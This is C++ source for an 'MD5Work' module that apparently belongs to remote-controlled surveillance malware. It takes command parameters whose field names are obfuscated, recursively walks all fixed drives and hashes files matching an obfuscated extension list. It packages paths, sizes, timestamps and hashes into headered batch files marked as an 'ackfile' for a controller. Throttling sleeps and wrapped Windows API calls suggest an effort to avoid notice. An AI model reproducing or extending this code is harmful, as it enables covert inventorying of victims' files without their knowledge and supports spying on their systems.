// MD5Work.cpp: implementation of the CMD5Work class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MD5Work.h"
#include "FilePublicFun.h"
#include "Struct.h"
#include "Base.h"
#include "WinApi.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

BOOL bGetMD5Start = FALSE;

DWORD WINAPI SetMD5FilterThread(LPVOID lp)
{
	ThreadParam *ppara=(ThreadParam*)lp;
	
	char buffer[2000];
	memset(buffer,0,2000);
	DWORD datalen=0;
	char md5str[33];
	memset(md5str, 0, 33);
	char TmpDeStr[30];
	char* typestr=NULL;
	char* timestr=NULL;
	char* lengthstr=NULL;
	char *inputline	=ppara->buf;
	char *nextline	=0;
	char *field		=0;
	char *value		=0;
	//初始化
	int re=0;
 	re=LineParser(inputline,&nextline,&field,&value);
	while(re)
	{
		if(strcmp(field, DeFileStringA(TmpDeStr, 30, "Vupk"))==0) //type
		{
			typestr=value;
		}
		else if(strcmp(field, DeFileStringA(TmpDeStr, 30, "VEWk"))==0) //time
		{
			timestr=value;
		}
		else if(strcmp(field, DeFileStringA(TmpDeStr, 30, "GkFgVM"))==0) //length
		{
			lengthstr=value;
		}
		inputline=nextline;
		re=LineParser(inputline,&nextline,&field,&value);
	}	
	if(typestr==NULL || timestr==NULL || lengthstr==NULL)
	{
		delete ppara;
		return 1;
	}

	MD5Work::GetInstance()->SetPara(timestr, lengthstr, typestr);

	if (bGetMD5Start)
	{
		delete ppara;
		return 0;
	}
	bGetMD5Start = TRUE;

	MD5Work::GetInstance()->DealMD5Data();
	bGetMD5Start = FALSE;
	
	delete ppara;
	return 0;
}

DWORD WINAPI OwnMD5FilterThread(LPVOID lp)
{
	PSleep(20*1000);

	while(g_md5work == FALSE)
	{
		PSleep(30000);
	}

	if (bGetMD5Start)
	{
		return 0;
	}
	bGetMD5Start = TRUE;
	
	MD5Work::GetInstance()->DealMD5Data();
	bGetMD5Start = FALSE;
	
	return 0;
}

DWORD OwnMD5Filter()
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	
	starthandle = CreateThread(NULL, 0, OwnMD5FilterThread, 0, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}

DWORD SetMD5Filter(DWORD* ppara)
{
	HANDLE starthandle=0;
	DWORD  threadId=0;
	ThreadParam *tmp=(ThreadParam*)ppara;
	ThreadParam *p = new ThreadParam;
	int len=sizeof(ThreadParam);
	memcpy(p, tmp, sizeof(ThreadParam));
	
	starthandle = CreateThread(NULL, 0, SetMD5FilterThread, p, 0, &threadId);
	if (starthandle != NULL)
		CloseHandle(starthandle);
	return 0;
}

MD5Work::MD5Work()
{
}

MD5Work::~MD5Work()
{
	if (SendBuf != NULL)
	{
		delete []SendBuf;
		SendBuf = NULL;
	}
}

void MD5Work::DestroyInstance()
{
	if ( m_pInstance != 0 )
	{
		delete m_pInstance;
		m_pInstance = 0;
	}
}

MD5Work *MD5Work::m_pInstance = 0;

MD5Work *MD5Work::GetInstance()
{
	if ( m_pInstance == 0 )
	{
		m_pInstance = new MD5Work();
	}
	
	return m_pInstance;
}

#define MD5MAXCOUNT	20

void MD5Work::Init()
{
	SendCount = 0;

	SendBuf = new char[1024*MD5MAXCOUNT+1024];
	offset = 1024;

	begtime = 0;
	endtime = 0;
	minfile = 30;
	maxfile = 2064074368;
	char typestr[500];
	DeFileStringA(typestr, 500, "0,10d1,3gS,3gp,3gpp,SSK,SWT,Sps,SIE,YWp,KTvlaFGlSv,vSV,vEIL,vAIe,vG,vlK,kpeY,H4I,HGI,gEH,MGI,MVW,EHlL,Ap2,Apkg,Apg,ApgdGSTgk,GTK,W4S,WsI,WlH,WlI,Wp3,Wp4,Wp4 (2),Wp41,Wpkg,Wpg,WpgS,lgg,lgI,pSTVESG,pvH,pFg,TSW,TW,TWIY,TVH,CgvlaFGlSv,VvG,VWp,VLV,IvSV,IlY,aSI,akYW,aWS,aWI,LGC,jEp");
	int len = strlen(typestr);
	TypeArr.clear();
	Split(typestr, len, ",", TypeArr);
}

BOOL MD5Work::SetPara(const char* timestr, const char * lengthstr, const char * type)
{
	sscanf(timestr, "%d-%d", &begtime, &endtime);
	sscanf(lengthstr, "%u-%u", &minfile, &maxfile);
	int len = strlen(type);
	TypeArr.clear();
	Split(type, len, ",", TypeArr);

	return TRUE;
}

BOOL MD5Work::DealMD5Data()
{
	char pdr[256];
	memset(pdr, 0, 256);
	int len = PGetLogicalDriveStringsA(256, pdr);
	char* p = pdr+len-4;
	for (; p >= pdr; p -= 4)
	{
		if ((*p == 'A') || (*p == 'a') ||
			(*p == 'B') || (*p == 'b'))
			continue;
		switch(PGetDriveTypeA(p))
		{
		case DRIVE_FIXED:	// 本地磁盘
			break;
		default:
			continue;
		}
		
		WCHAR wDriver[10];
		GB23122Unicode(p, wDriver, 10*sizeof(WCHAR));
		MD5_GetPathStruct(wDriver);
		
		PSleep(1000);
	}

	WriteMD5Buf("", 0, TRUE);

	return TRUE;
}

BOOL MD5Work::WriteMD5Buf(const char * Buf, DWORD Buflen, BOOL bFinish)
{
	PSleep(50);

	SendCount++;
	
	memcpy(SendBuf+offset, Buf, Buflen);
	offset += Buflen;
	
//	OutputDebugStringA("WriteBuf");
	
	if (SendCount >= MD5MAXCOUNT || (bFinish && offset>1024))
	{
//				OutputDebugStringA("SendBuf");
		char tmpbuf[1024];
		// 生成描述信息
		SYSTEMTIME nowtime;
		PGetLocalTime(&nowtime);
		
		char browserfilename[MAX_PATH];
		char browserfilea[MAX_PATH];
		char FixDir[10];
		char TmpStr1[10], TmpStr2[10], TmpStr3[20], TmpStr4[50];
		strcpy(FixDir, GetTmpPrevFix(FIX_MD5FILTER));
		CreateFileName(FixDir, browserfilename, browserfilea);		// 得到目标文件名
		DeFileStringA(TmpStr1, 10, "VEWk"); //time
		DeFileStringA(TmpStr2, 10, "SKsHEGk"); //ackfile
		DeFileStringA(TmpStr3, 20, "KlFVkFVdGkFgVM"); //content-length
		DeFileStringA(TmpStr4, 50, "KlFVkFVdVupk: Wv5HEGVkT"); //content-type: md5filter
		int len = sprintf(tmpbuf, "%s: %04d%02d%02d%02d%02d%02d\r\n%s: %s\r\n%s: %d\r\n%s\r\n\r\n", TmpStr1,
			nowtime.wYear, nowtime.wMonth, nowtime.wDay, nowtime.wHour, nowtime.wMinute, nowtime.wSecond, 
			TmpStr2, browserfilea, TmpStr3, offset-1024, TmpStr4);
		
		int datalen = offset-1024 + len;
		memcpy(SendBuf+1024-len, tmpbuf, len);
		
		char *pBuffer = new char[datalen+10];
		memset(pBuffer, 0, datalen+10);
		memcpy(pBuffer, SendBuf+1024-len, datalen);
		
		// #ifdef _DEBUG
		// 	FILE * fs;
		// 	fs=fopen("c:\\systeminfo.txt","w+b");
		// 	fwrite(pBuffer,1,datalen,fs);
		// 	fclose(fs);
		// #endif	
		
		myWriteFile(pBuffer, datalen, browserfilename, browserfilea);
		
		delete []pBuffer;
		memset(SendBuf, 0, 1024*SendCount+1024);
		SendCount = 0;
		offset = 1024;
		
		PSleep(2000);
	}
	
	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//枚举直接写文件, 因为内存分配过大有可能分不出
BOOL MD5Work::MD5_GetPathStruct(WCHAR * p)
{
	DIRLIST	dirlist;
	dirlist.filecount = 0;
	dirlist.filelist = NULL;
	wcsncpy(dirlist.rootdir, p, MAX_PATH);//"c:\"
	
	if (dirlist.rootdir[wcslen(p)-1] ==L'\\')
	{
		dirlist.rootdir[wcslen(p)-1]=L'\0';
	}

	if(GetDirList(dirlist))
	{
		PSleep(1);
		//改为ini的方式,方便读
		char tmpbuf[1024];
		int dirlen=0;

		char filename[3*MAX_PATH], filepath[3*MAX_PATH], rootdir[3*MAX_PATH], filetype[MAX_PATH];
		WCHAR wfilename[MAX_PATH];
		unsigned __int64 filelen;
		char md5str[33];
		Unicode2UTF_8(dirlist.rootdir, rootdir, 3*MAX_PATH-1);

		int runtimes=0;
		for (int i = 0; i < dirlist.filecount; i++)
		{
			int len=0;

			runtimes++;
			if(runtimes>20)
			{
				runtimes=0;
				PSleep(1);
			}
			//时间 \t 大小 \t文件名 \tMD5
			if(dirlist.filelist[i].filetype==0)
			{
				time_t ltime, createtime, accesstime;
				FileTimeToTime_t(dirlist.filelist[i].filetime, &ltime);
				FileTimeToTime_t(dirlist.filelist[i].createfiletime, &createtime);
				FileTimeToTime_t(dirlist.filelist[i].accesstime, &accesstime);

				if (begtime > ltime)
				{
					continue;
				}
				else if (endtime < ltime && endtime != 0)
				{
					continue;
				}

				filelen = dirlist.filelist[i].filesize;
				if (minfile > filelen)
				{
					continue;
				}
				else if (maxfile < filelen && maxfile != 0)
				{
					continue;
				}
				
				Unicode2UTF_8(dirlist.filelist[i].filename, filename, 3*MAX_PATH-1);
				memset(filetype, 0, MAX_PATH);
				char * pos;
				BOOL bfind = FALSE;

				if ((pos = strrchr(filename, '.')) != NULL)
				{
					strcpy(filetype, pos+1);
					for (int j = 0; j < TypeArr.size(); j++)
					{
						if (stricmp(filetype, TypeArr[j].c_str()) == 0)
						{
							bfind = TRUE;
							break;
						}
					}
				}
				else
				{
					for (int j = 0; j < TypeArr.size(); j++)
					{
						if (stricmp("null", TypeArr[j].c_str()) == 0)
						{
							bfind = TRUE;
							break;
						}
					}
				}

				if (!bfind)
					continue;

				memset(md5str, 0, 33);
				sprintf(filepath, "%s\\%s", rootdir, filename);

				swprintf(wfilename, L"%s\\%s", dirlist.rootdir, dirlist.filelist[i].filename);

				if(MD5TranFile1(md5str, wfilename) == FALSE)
					continue;

				len = sprintf(tmpbuf, "%d\t%I64d\t%s\t%s\t%d\t%d\r\n",
					ltime, filelen, filepath, md5str, createtime, accesstime);

				WriteMD5Buf(tmpbuf, len);
			}
		}
	
		for (int ii=0;ii < dirlist.filecount; ii++)
		{
			if(dirlist.filelist[ii].filetype!=0)
			{
				WCHAR subDir[MAX_PATH];
				swprintf(subDir, L"%s\\%s", dirlist.rootdir, dirlist.filelist[ii].filename);
				MD5_GetPathStruct(subDir);
			}
		}
	}

	return TRUE;
}